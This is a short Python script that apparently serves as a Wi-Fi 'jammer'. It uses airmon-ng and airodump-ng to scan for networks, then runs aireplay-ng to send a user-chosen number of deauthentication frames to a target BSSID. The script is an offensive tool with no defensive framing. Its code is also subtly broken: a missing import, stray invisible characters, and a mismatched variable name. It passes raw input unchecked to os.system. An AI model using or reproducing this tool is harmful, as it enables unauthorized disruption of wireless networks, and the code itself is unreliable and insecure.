adapter = input ("Adapter Name : ")

def scan():
  mmd​=​"airmon-ng start "​+​adapter
  code1​=​"airodump-ng "​+​adapter​+​"mon"
  os.system(mmd)
  os.system(code1)
  
def jam():
  bssid​=​ ​input​(​"[target BSSID] >>"​) 
  attack​=​ ​input​(​"[No of Requests] >>"​) 
  code2​=​"aireplay-ng --deauth "​+​attack​+​" -a "​+​bssid​+​" "​+​adapter​+​"mon" 
  os​.​system​(​code2​)
  
  
Bash = input ("Bash : ")

if bash == "scan" :
  scan()
  
elif bash == "jam" :
  jam()
  
  

  
